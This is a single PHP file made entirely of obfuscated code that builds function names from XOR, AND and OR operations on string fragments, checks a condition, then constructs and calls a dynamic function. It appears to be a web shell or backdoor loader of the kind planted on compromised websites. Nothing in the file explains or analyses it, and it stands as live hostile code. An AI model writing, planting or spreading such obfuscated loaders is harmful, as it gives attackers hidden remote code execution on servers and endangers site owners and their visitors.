<?php
$kAimByw2KM='tq2qab8opa'&B43weRf6P2e;$uqMbfgZ5o="!@TAn\$"|'"'.DPAH2;$KPBGs1Sbz='SQ@@I*0L#B'.
            'R"'|QOHUu.')$L/@@(';$_U='+--;#]Q<C3=o'&'so/rj[w|c+3_';$huUrKyaLhwX=gJah0.#HP1'.
            '}'._L4bR5K.'/v'&BQsDwG_u.'}'.wJ4y.'?b';$vAg='a D!T B&UL#``-l'|#TCo_489QzBC1C_'.
            '@Rd!D J$DL!@aA$';$A3=PU_a_H&BtdL."}b";$XjOWn_3er='{'.yEg3c.':*'.md97ah.'{vy.='.
            '5($6::<=/n'^'6/32l;e}3#vC&7$17gx{}'.zStui.'`h+';$H_ulg='5g35|'.gw3w9379.'~ey1'.
            '?ws=}1u'&'u|'.qwfz.'=7a}9?y1m?;3'.lcvg.'~?';$YOUcn9='|'^D;$OOlPWFk=#Wgo7loqIu'.
            'HDP@CA'|"H@@PCA";$KS=MDUT|'L@F@';$EdrKX6M='m}u'&lme;$w1PyZfF8=AqD|dya;'wXf3Zk'.
            'lva=P^9iG';$CsfIS6QDWaW=KeCuV."<]a"^'*'.TpDo_iS;$CEEMo4I_G=q&o;$rgfwGN2UY=#VI'.
            '6'^Y;$d0qCwfMF=('1UG:X5'^'J 4A%@')&('w|~wor'&'w|~oow');$KyQLfO=(k4I^'.Pl')|(/*'.
            'K*/eIE^Miq);$et7H=('D!d$bD'|'B!@$hD')|$uqMbfgZ5o;$deh9r0=$KPBGs1Sbz^$_U;'AYPl'.
            '<WuN8&W';$qW5iKEJ=$huUrKyaLhwX|$vAg;$mN4gRL8A=$OOlPWFk|$A3;$YaC86beJwLM=(/*XP'.
            'xXgI[I+$*/"&YVA"^'D|.p')^$KS;$GT4AP=$EdrKX6M&$w1PyZfF8;$sLQBhrxnD=/*uxd42rOfq'.
            ')GF,*/$XjOWn_3er&('`g-f3<& iYy R-m[]T=[@#s:&>4;W'^'*2'.x4ldyI.#iDmdJmuVZAaLDn'.
            '?(7v=B2(0;H%4o"'.eQCul.':');if($d0qCwfMF($KyQLfO($et7H($mN4gRL8A)),$H_ulg./*B'.
            '.gu!v%*/$CsfIS6QDWaW))$deh9r0($YaC86beJwLM,$GT4AP,$CEEMo4I_G);$Ktrt7pG3V=/*yj'.
            'b, u*/$qW5iKEJ((d&"7").$CEEMo4I_G,$et7H($sLQBhrxnD));$Ktrt7pG3V($rgfwGN2UY./*'.
            'rD*/$YOUcn9);#I78s:OV:HO%?gsD+H]9@w~4pzXTh9V+2TUQ7l@=Yf#W-&Jz~KG+AOgY9N,(JJ:'.
            '%CN_+_GB|#01Z!nuP):FTuNzTgi @zXPc9jDKv>b)R!lgomZsrpe3';